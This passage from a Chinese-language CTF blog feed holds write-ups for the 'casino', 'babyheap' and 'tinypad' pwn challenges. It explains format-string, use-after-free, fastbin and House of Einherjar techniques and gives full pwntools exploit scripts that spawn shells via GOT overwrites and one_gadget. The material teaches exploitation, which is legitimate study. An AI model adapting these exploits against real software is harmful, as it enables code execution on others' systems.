class="line"></span><br><span class="line">sh=process(&quot;./timerand&quot;)</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int seed;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;seed);</span><br><span class="line">srand(seed);</span><br><span class="line">for(i = 0; i &lt; 100; i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d &quot;,rand());</span><br><span class="line">   &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">sh.sendline(str(now))</span><br><span class="line">rand=sh.recvuntil(&quot;\n&quot;).strip().split(&quot; &quot;)</span><br><span class="line">print rand</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)</span><br><span class="line">sh=process(&apos;./casino&apos;)</span><br><span class="line">sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">for i in range(99):</span><br><span class="line">   sh.sendlineafter(&quot;number: &quot;,rand[i])</span><br><span class="line">print sh.recv()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import cdll</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./casino&quot;)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(&quot;%8$p&quot;)</span><br><span class="line">sh.recvuntil(&apos;Welcome &apos;)</span><br><span class="line">seed =eval(sh.recvuntil(&apos;\n&apos;,drop=True))&amp;0xffffffff  &lt;--- 数据类型转换成int型</span><br><span class="line">print seed</span><br><span class="line">sh.close()</span><br><span class="line">seed += 3       &lt;----还是不清楚这个3怎么计算出来的，或许是因为两个程序打开具有延迟？？</span><br><span class="line">libc = cdll.LoadLibrary(&quot;&quot;)   &lt;--- 突然发现这里为空也不影响？？</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./casino&apos;)</span><br><span class="line">pay = &apos;aaa%11$n&apos;+p64(0x602020)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(pay)</span><br><span class="line">for i in range(99):</span><br><span class="line">sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int create()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t edit()</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line"></span><br><span class="line">  printf(&quot;Content? &quot;);</span><br><span class="line">  result = read(0, buf, 0x40uLL);</span><br><span class="line">  edit_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  result = printf(&quot;Content: %s\n&quot;, buf);</span><br><span class="line">  show_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  free(buf);                                    // UAF</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 0LL;</span><br><span class="line">  delete_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 fill()</span><br><span class="line">&#123;</span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  printf(&quot;Fill &quot;);</span><br><span class="line">  read(0, buf, 0x40uLL);</span><br><span class="line">  return fill_inuse++ + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>各项功能除了次数检查基本没有限制，所以在有限的步骤内将chunk分配到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A0 create_inuse   </span><br><span class="line">.bss:00000000006020A8 edit_inuse   </span><br><span class="line">.bss:00000000006020B0 show_inuse      </span><br><span class="line">.bss:00000000006020B8 delete_inuse    </span><br><span class="line">.bss:00000000006020C0 fill_inuse     </span><br><span class="line">.bss:00000000006020C8 ; void *buf</span><br></pre></td></tr></table></figure><p>我们可以使用UAF漏洞＋fastbinattack达到目的，这样不仅消除了次数限制问题，同时可以随意修改指针<br>所以之后便是先泄露libc基址，之后修改atoi.got表为system,输入’/bin/sh’即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">def new():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def edit(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">  sh.sendafter(&quot;Content? &quot;,note)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">def  show():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)</span><br><span class="line">  sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">  return sh.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def  fill(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1337&quot;)</span><br><span class="line">  sh.sendafter(&quot;Fill &quot;,note)</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./babyheap&quot;)</span><br><span class="line">elf = ELF(&quot;./babyheap&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">delete()</span><br><span class="line">edit(p64(0x602095-8))</span><br><span class="line">new()</span><br><span class="line">fill(&apos;/bin/sh&apos;+chr(0)+&apos;a&apos;*0x33+p64(0x602060)[0:3])</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">libc_addr = u64(sh.recvuntil(&apos;\n&apos;)[:-1].ljust(8,&apos;\x00&apos;))-libc.plt[&apos;atoi&apos;]</span><br><span class="line">print &quot;libc_addr : &quot; + hex(libc_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">system_addr = libc_addr + libc.plt[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;leakless&quot;&gt;&lt;a href=&quot;#leakless&quot; class=&quot;headerlink&quot; title=&quot;leakless&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.8-HouseOfEinherjar</title>
    <link href="http://siriuswhiter.tk/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/"/>
    <id>http://siriuswhiter.tk/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/</id>
    <published>2019-01-24T09:32:53.000Z</published>
    <updated>2019-01-25T06:55:36.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Einherjar-原理"><a href="#House-of-Einherjar-原理" class="headerlink" title="House of Einherjar 原理"></a>House of Einherjar 原理</h1><p>感觉像是把好几种漏洞结合起来：<br>    off by one<br>    unlink （需要能够完全溢出到下一个堆来控制<br>    chunk entend or shrink; 但是细节却不相同。</p><p>该利用需要：</p><ol><li>chunk能够覆盖next_chunk的pre_size并修改pre_inuse位</li><li>泄露地址使得unlink 检查pre_size与size时能够绕过</li><li>fake_chunk的fd 与 bk指针需要能够绕过检查</li></ol><p>当我们能够覆盖nextchunk的pre_size位及pre_inuse位时，我们便可以伪造fake_chunk，之后在free next_chunk时，fake_chunk通过伪造便能绕过检查被置入bin中</p><h1 id="Tinypad"><a href="#Tinypad" class="headerlink" title="Tinypad"></a>Tinypad</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>程序自己重写了许多write read函数<br>主要功能 add edit delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(c) = i + &apos;1&apos;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</span><br><span class="line">        writeln(*(char **)&amp;tinypad[16 * (i + 16LL) + 8], v3);</span><br><span class="line">      &#125;</span><br><span class="line">      writeln(&quot;\n&quot;, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      write_n(</span><br><span class="line">    &quot;+- MENU -----------------------------------------------------------------------+\n&quot;</span><br><span class="line">    &quot;| [A] Add memo                                                                 |\n&quot;</span><br><span class="line">    &quot;| [D] Delete memo                                                              |\n&quot;</span><br><span class="line">    &quot;| [E] Edit memo                                                                |\n&quot;</span><br><span class="line">    &quot;| [Q] Quit                                                                     |\n&quot;</span><br><span class="line">    &quot;+------------------------------------------------------------------------------+\n&quot;,</span><br><span class="line">    486LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( cmd == &apos;D&apos; )                           // delete</span><br><span class="line">    &#123;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )// inuse</span><br><span class="line">        &#123;</span><br><span class="line">          free(*(void **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);// ptr</span><br><span class="line">          *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] = 0LL;</span><br><span class="line">          writeln(&quot;\nDeleted.&quot;, 9LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      if ( cmd = &apos;E&apos; )</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          c = &apos;0&apos;;</span><br><span class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">          while ( toupper(c) != &apos;Y&apos; )</span><br><span class="line">          &#123;</span><br><span class="line">            write_n(&quot;CONTENT: &quot;, 9LL);</span><br><span class="line">            v6 = strlen(tinypad);</span><br><span class="line">            writeln(tinypad, v6);</span><br><span class="line">            write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">            read_until(tinypad, v7, &apos;\n&apos;);</span><br><span class="line">            writeln(&quot;Is it OK?&quot;, 9LL);</span><br><span class="line">            write_n(&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</span><br><span class="line">            read_until((char *)&amp;c, 1uLL, &apos;\n&apos;);</span><br><span class="line">          &#125;</span><br><span class="line">          strcpy(*(char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8], tinypad);</span><br><span class="line">          writeln(&quot;\nEdited.&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      if ( cmd != &apos;A&apos; )</span><br><span class="line">        goto LABEL_43;</span><br><span class="line">      while ( idx &lt;= 3 &amp;&amp; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] )</span><br><span class="line">        ++idx;</span><br><span class="line">      if ( idx == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        writeln(&quot;No space is left.&quot;, 17LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        size = -1;</span><br><span class="line">        write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        size = read_int();</span><br><span class="line">        if ( size &lt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = size;</span><br><span class="line">          if ( (unsigned __int64)size &gt; 0x100 )</span><br><span class="line">            v5 = 256;</span><br><span class="line">        &#125;</span><br><span class="line">        size = v5;                              // max size =256</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5;</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(size);</span><br><span class="line">        if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )// 检查inuse位</span><br><span class="line">        &#123;</span><br><span class="line">          writerrln(&quot;[!] No memory is available.&quot;, 27LL);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">        read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], size, 0xAu);</span><br><span class="line">        writeln(&quot;\nAdded.&quot;, 7LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( cnt != 81 );</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为读取输出函数都是重写的，比较麻烦，但是手动测试能够发现最低位的覆盖问题</p><p>再有在delete时仅将size清零并free chunk，没有将chunk 指针清零，UAF漏洞存在</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./tinypad&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;A&quot;)</span><br><span class="line">    p.recvuntil(&quot;(SIZE)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line">def delete(index):</span><br><span class="line"> </span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;D&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line">def edit(index, content, ok=True):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;E&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(&quot;(Y/n)&gt;&gt;&gt; &quot;)</span><br><span class="line">    if ok:</span><br><span class="line">        p.sendline(&quot;Y&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendline(&quot;n&quot;)</span><br><span class="line"> </span><br><span class="line">#stage one</span><br><span class="line">add(0x80, &quot;A&quot;*0x80)</span><br><span class="line">add(0x80, &quot;B&quot;*0x80)</span><br><span class="line">add(0x80, &quot;C&quot;*0x80)</span><br><span class="line">add(0x80, &quot;D&quot;*0x80)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">heap = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x120</span><br><span class="line">log.info(&quot;heap_base: %s&quot; % hex(heap))</span><br><span class="line">p.recvuntil(&quot; #   INDEX: 3\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8, &quot;\x00&quot;)) - 0x58</span><br><span class="line">log.info(&quot;main_arena: %s&quot; % hex(main_arena))</span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br><span class="line"> </span><br><span class="line">#stage two</span><br><span class="line">add(0x18, &quot;A&quot;*0x18)</span><br><span class="line">add(0x100, &quot;B&quot;*0xf8 + p64(0x11))</span><br><span class="line">add(0x100, &quot;C&quot;*0xf8)</span><br><span class="line">add(0x100, &quot;D&quot;*0xf8)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tinypad = 0x602040</span><br><span class="line">offset = heap + 0x20 - 0x602040 - 0x20</span><br><span class="line">fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2</span><br><span class="line"> </span><br><span class="line">edit(3, &quot;D&quot;*0x20 + fake_chunk)</span><br><span class="line">zero_byte_number = 8 - len(p64(offset).strip(&quot;\x00&quot;))</span><br><span class="line">for i in range(zero_byte_number+1):</span><br><span class="line">  data = &quot;A&quot;*0x10 + p64(offset).strip(&quot;\x00&quot;).rjust(8-i, &apos;f&apos;)</span><br><span class="line">  edit(1, data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">edit(4, &quot;D&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2)</span><br><span class="line"> </span><br><span class="line">#gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">#stage three</span><br><span class="line">libc_base = main_arena + 0x58 - 0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: %s&quot; % hex(libc_base))</span><br><span class="line">one_gadget =  libc_base + 0x45216</span><br><span class="line">environ_pointer = libc_base + libc.symbols[&apos;__environ&apos;]</span><br><span class="line"> </span><br><span class="line">add(0xf0, &quot;A&quot;*0xd0 + p64(0x18) + p64(environ_pointer) + &apos;a&apos;*8 + p64(0x602148))</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x8*30</span><br><span class="line">log.info(&quot;main_ret_addr: %s&quot; % hex(main_ret))</span><br><span class="line">log.info(&quot;one_gadget_addr :%s &quot;% hex(one_gadget))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;Q&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Einherjar-原理&quot;&gt;&lt;a href=&quot;#House-of-Einherjar-原理&quot; class=&quot;headerlink&quot; title=&quot;House of Einherjar 原理&quot;&gt;&lt;/a&gt;House of Einherjar 原理&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
</feed>
